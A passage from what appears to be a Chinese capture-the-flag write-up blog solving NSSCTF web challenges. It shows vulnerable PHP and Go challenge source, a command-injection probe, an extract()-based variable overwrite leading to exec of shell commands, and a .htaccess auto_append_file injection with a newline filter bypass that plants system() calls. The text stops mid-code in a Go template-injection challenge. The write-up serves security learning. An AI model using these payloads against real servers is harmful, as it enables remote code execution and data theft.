&#x27;A=|echo;id&#x27;</span><br></pre></td></tr></table></figure><p>poc执行不了，没办法，正常打吧</p><p>读取一下上层目录的index.php.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;main&quot;</span>,<span class="string">&quot;main&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;Class.php&quot;</span>;</span><br><span class="line"><span class="variable">$temp</span> = <span class="keyword">new</span> <span class="title class_">Temp</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$temp</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205185132883.png" alt="image-20241205185132883"></p><p>不让我读？？！！</p><p>为啥啊，试试之前的.txt格式，可以了！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">defined</span>(<span class="string">&#x27;main&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">Class Temp&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$date</span>=[<span class="string">&#x27;version&#x27;</span>=&gt;<span class="string">&#x27;1.0&#x27;</span>,<span class="string">&#x27;img&#x27;</span>=&gt;<span class="string">&#x27;https://www.apache.org/img/asf-estd-1999-logo.jpg&#x27;</span>];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$template</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;date = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;date,<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getTempName</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$dir</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dir</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;template = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;./template/admin/&#x27;</span>.<span class="variable">$template</span>);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;template))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;template = <span class="string">&#x27;./template/index.html&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$space</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">extract</span>(<span class="variable">$this</span>-&gt;date);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getTempName</span>(<span class="variable">$template</span>,<span class="variable">$space</span>);</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;template);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">listdata</span>(<span class="params"><span class="variable">$_params</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$system</span> = [</span><br><span class="line">            <span class="string">&#x27;db&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;app&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;num&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sum&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;form&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;page&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;site&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;not_flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;show_flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;more&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;catid&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;field&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;order&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;space&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;table&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;table_site&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;total&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;join&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;on&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;return&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;sbpage&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;module&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;urlrule&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;pagesize&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;pagefile&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$param</span> = <span class="variable">$where</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_params</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_params</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$params</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27; &#x27;</span>, <span class="variable">$_params</span>);<span class="comment">//action=list module=$mod</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$params</span>[<span class="number">0</span>], [<span class="string">&#x27;list&#x27;</span>,<span class="string">&#x27;function&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$params</span>[<span class="number">0</span>] = <span class="string">&#x27;action=&#x27;</span>.<span class="variable">$params</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$t</span>) &#123;</span><br><span class="line">            <span class="variable">$var</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$t</span>, <span class="number">0</span>, <span class="title function_ invoke__">strpos</span>(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>));</span><br><span class="line">            <span class="variable">$val</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$t</span>, <span class="title function_ invoke__">strpos</span>(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$var</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$system</span>[<span class="variable">$var</span>])) &#123; </span><br><span class="line">                <span class="variable">$system</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$param</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// action</span></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$system</span>[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;function&#x27;</span>:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">return</span>  <span class="string">&#x27;hacker!!&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;hacker!!&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$force</span> = <span class="variable">$param</span>[<span class="string">&#x27;force&#x27;</span>];</span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable">$force</span>) &#123;</span><br><span class="line">                    <span class="variable">$p</span> = [];</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$param</span> <span class="keyword">as</span> <span class="variable">$var</span> =&gt; <span class="variable">$t</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$var</span>, <span class="string">&#x27;param&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="variable">$n</span> = <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$var</span>, <span class="number">5</span>));</span><br><span class="line">                            <span class="variable">$p</span>[<span class="variable">$n</span>] = <span class="variable">$t</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$p</span>) &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="variable">$rt</span> = <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>], <span class="variable">$p</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$rt</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$rt</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$this</span>-&gt;date);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先</p><p>new Temp时会对this-&gt;date赋值，然后进入display()方法后发现有一个extract($this-&gt;date);，这可以进行变量覆盖，看后面$this-&gt;getTempName($template,$space);，跟进后发现$dir需要为admin，那么我们变量覆盖即可，POST一个space&#x3D;admin，接着看后面if(!is_file($this-&gt;template))，让GET ?file&#x3D;index.html即可。</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205190842283.png" alt="image-20241205190842283" style="zoom:80%;" /><p>然后此处include了这串php代码，调用了listdata方法，传参action&#x3D;list module&#x3D;$mod</p><p>这里只有$mod时可控的。</p><blockquote><p>action&#x3D;list&amp;module&#x3D;$mod</p><p>mod&#x3D;xxx action&#x3D;function </p><p>action&#x3D;list module&#x3D;xxx action&#x3D;function  force&#x3D;false name&#x3D;phpinfo()</p></blockquote><p>这里后面传入的action把前面的list覆盖掉就可以了，用function来覆盖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:?filename=index.html</span><br><span class="line">POST:space=admin&amp;mod=xxx action=function  force=0 name=phpinfo</span><br></pre></td></tr></table></figure><p>在phpinfo里面可以找到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;45956a8b-37e3-43e1-9ec0-664239b74a90&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:?filename=index.html</span><br><span class="line">POST:space=admin&amp;mod=xxx action=function  force=0 name=exec param=tac$&#123;IFS&#125;/f11111111aaaagggg&gt;1.txt</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205195913384.png" alt="image-20241205195913384"></p><h2 id="羊城杯-2020-easyphp"><a href="#羊城杯-2020-easyphp" class="headerlink" title="[羊城杯 2020]easyphp"></a>[羊城杯 2020]easyphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>很好绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=b.php&amp;content=&lt;?php system(&#x27;ls /&#x27;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205202211925.png" alt="image-20241205202211925"></p><p>没有解析php，为啥啊明明是php但是解析不了，可能是靶机目录环境不能解析php文件</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205202303024.png" alt="image-20241205202303024"></p><p>Apache服务器</p><p>尝试用.htaccess来执行jpg文件中的php代码</p><p>但是这里被过滤了啊</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=.htaccess&amp;content=AddType application/x-http-php .jpg</span><br></pre></td></tr></table></figure><p>但这个过滤是很好绕过的可以用反斜杠加%0a来绕过，但是这样的话就要求上传两次文件，而这个题目环境不能上传两次文件，因此只能上传一次.htaccess，那么能利用的就只有index.php了，这还不如直接写入index.php文件呢！但是是不能解析的。因此我们只能利用.htaccess来进行命令执行或者写马，简单！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_fi\%0ale .htaccess%0a%23&lt;?php system(&#x27;ls /&#x27;);?&gt;\</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=.htaccess&amp;content=php_value auto_append_fi\%0Ale .htaccess%0A%23&lt;?php system(&#x27;tac /f*&#x27;);?&gt;\</span><br></pre></td></tr></table></figure><h2 id="SCTF-2021-loginme"><a href="#SCTF-2021-loginme" class="headerlink" title="[SCTF 2021]loginme"></a>[SCTF 2021]loginme</h2><p>获得源码</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206105852832.png" alt="image-20241206105852832" style="zoom:80%;" /><p>过滤了俩，可以用用X-Real-IP</p><p>然后看看源码route.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">_ <span class="string">&quot;embed&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;html/template&quot;</span></span><br><span class="line"><span class="string">&quot;loginme/structs&quot;</span></span><br><span class="line"><span class="string">&quot;loginme/templates&quot;</span></span><br><span class="line"><span class="string">&quot;strconv&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">c.HTML(<span class="number">200</span>, <span class="string">&quot;index.tmpl&quot;</span>, gin.H&#123;</span><br><span class="line"><span class="string">&quot;title&quot;</span>: <span class="string">&quot;Try Loginme&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">idString, flag := c.GetQuery(<span class="string">&quot;id&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> !flag &#123;</span><br><span class="line">idString = <span class="string">&quot;1&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">id, err := strconv.Atoi(idString)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">id = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line">TargetUser := structs.Admin</span><br><span class="line"><span class="keyword">for</span> _, user := <span class="keyword">range</span> structs.Users &#123;</span><br><span class="line"><span class="keyword">if</span> user.Id == id &#123;</span><br><span class="line">TargetUser = user</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">age := TargetUser.Age</span><br><span class="line"><span class="keyword">if</span> age == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">age, flag = c.GetQuery(<span class="string">&quot;age&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> !flag &#123;</span><br><span class="line">age = <span class="string">&quot;forever 18 (Tell me the age)&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.AbortWithError(<span class="number">500</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">html := fmt.Sprintf(templates.AdminIndexTemplateHtml, age)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.AbortWithError(<span class="number">500</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tmpl, err := template.New(<span class="string">&quot;admin_index&quot;</span>).Parse(html)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.AbortWithError(<span class="number">500</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tmpl.Execute(c.Writer, TargetUser)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>structs.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> structs</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> UserInfo <span class="keyword">struct</span> &#123;</span><br><span class="line">Id       <span class="type">int</span></span><br><span class="line">Username <span class="type">string</span></span><br><span class="line">Age      <span class="type">string</span></span><br><span class="line">Password <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Users = []UserInfo&#123;</span><br><span class="line">&#123;</span><br><span class="line">Id:       <span class="number">1</span>,</span><br><span class="line">Username: <span class="string">&quot;Grandpa Lu&quot;</span>,</span><br><span class="line">Age:      <span 